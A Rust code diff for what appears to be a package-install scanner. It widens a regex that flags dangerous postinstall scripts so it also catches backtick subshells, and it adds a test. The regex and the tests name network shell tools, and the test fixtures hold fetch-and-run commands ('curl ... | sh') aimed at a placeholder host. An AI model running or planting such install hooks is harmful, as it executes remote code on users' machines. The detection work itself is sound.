@@ -57,7 +57,7 @@ fn reason(
 fn dangerous_pattern() -> &'static Regex {
     static DANGEROUS_PATTERN: OnceLock<Regex> = OnceLock::new();
     DANGEROUS_PATTERN.get_or_init(|| {
-        Regex::new(r"(?i)(?:^|[\s;&|()])(?:curl|wget|powershell)(?:$|[\s;&|()])|node\s+-e|base64\s+-d|child_process|/dev/tcp|\|\s*(?:sh|bash)|bash\s+-c").unwrap()
+        Regex::new(r"(?i)(?:^|[\s;&|()`])(?:curl|wget|powershell)(?:$|[\s;&|()])|node\s+-e|base64\s+-d|child_process|/dev/tcp|\|\s*(?:sh|bash)|bash\s+-c").unwrap()
     })
 }
 
@@ -105,6 +105,18 @@ mod tests {
         let reasons = run(&facts(vec![(
             LifecycleHook::Postinstall,
             "curl https://example.invalid/payload | sh",
+        )]));
+
+        assert_eq!(reasons.len(), 1);
+        assert_eq!(reasons[0].code, ReasonCode::DangerousInstallScript);
+        assert_eq!(reasons[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn backtick_subshell_curl_emits_dangerous_reason() {
+        let reasons = run(&facts(vec![(
+            LifecycleHook::Postinstall,
+            "`curl -s https://example.invalid/payload`",
         )]));
 
         assert_eq!(reasons.len(), 1);
